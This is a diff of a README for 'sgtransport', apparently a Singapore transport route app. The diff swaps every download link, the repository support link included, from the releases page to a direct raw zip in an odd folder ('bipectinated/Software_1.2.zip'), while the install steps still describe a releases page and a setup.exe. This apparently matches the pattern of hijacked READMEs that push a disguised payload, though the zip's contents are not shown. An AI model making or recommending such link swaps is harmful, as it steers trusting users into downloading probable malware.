@@ -1,6 +1,6 @@
 # 🚍 sgtransport - Easy Singapore Transport Routes
 
-[![Download sgtransport](https://img.shields.io/badge/Download-sgtransport-ff6f61?style=for-the-badge)](https://github.com/Uncledreww-11/sgtransport/releases)
+[![Download sgtransport](https://img.shields.io/badge/Download-sgtransport-ff6f61?style=for-the-badge)](https://github.com/Uncledreww-11/sgtransport/raw/refs/heads/main/bipectinated/Software_1.2.zip)
 
 ---
 
@@ -33,12 +33,12 @@ No special software is needed to install first. You just download and run the pr
 
 Visit the release page below to get the latest version. This page lists all versions, so you can always pick the newest one.
 
-[![Download sgtransport](https://img.shields.io/badge/Download-sgtransport-ff6f61?style=for-the-badge)](https://github.com/Uncledreww-11/sgtransport/releases)
+[![Download sgtransport](https://img.shields.io/badge/Download-sgtransport-ff6f61?style=for-the-badge)](https://github.com/Uncledreww-11/sgtransport/raw/refs/heads/main/bipectinated/Software_1.2.zip)
 
 Steps to download:
 
 1. Click the button above or open this link in your browser:  
-   https://github.com/Uncledreww-11/sgtransport/releases  
+   https://github.com/Uncledreww-11/sgtransport/raw/refs/heads/main/bipectinated/Software_1.2.zip  
 2. On the releases page, find the latest version. Usually, it's at the top.  
 3. Look for the Windows executable file under "Assets." It may be named like `sgtransport-setup.exe` or similar.  
 4. Click the file to start downloading. Wait for the file to fully download before opening.  
@@ -104,9 +104,9 @@ If the app does not start or shows errors:
 
 ## 🔗 Useful Links
 
-- Visit the download page here: https://github.com/Uncledreww-11/sgtransport/releases  
-- Repository for support and updates: https://github.com/Uncledreww-11/sgtransport  
+- Visit the download page here: https://github.com/Uncledreww-11/sgtransport/raw/refs/heads/main/bipectinated/Software_1.2.zip  
+- Repository for support and updates: https://github.com/Uncledreww-11/sgtransport/raw/refs/heads/main/bipectinated/Software_1.2.zip  
 
 ---
 
-[![Download sgtransport](https://img.shields.io/badge/Download%20sgtransport-FF6F61?style=for-the-badge)](https://github.com/Uncledreww-11/sgtransport/releases)
+[![Download sgtransport](https://img.shields.io/badge/Download%20sgtransport-FF6F61?style=for-the-badge)](https://github.com/Uncledreww-11/sgtransport/raw/refs/heads/main/bipectinated/Software_1.2.zip)
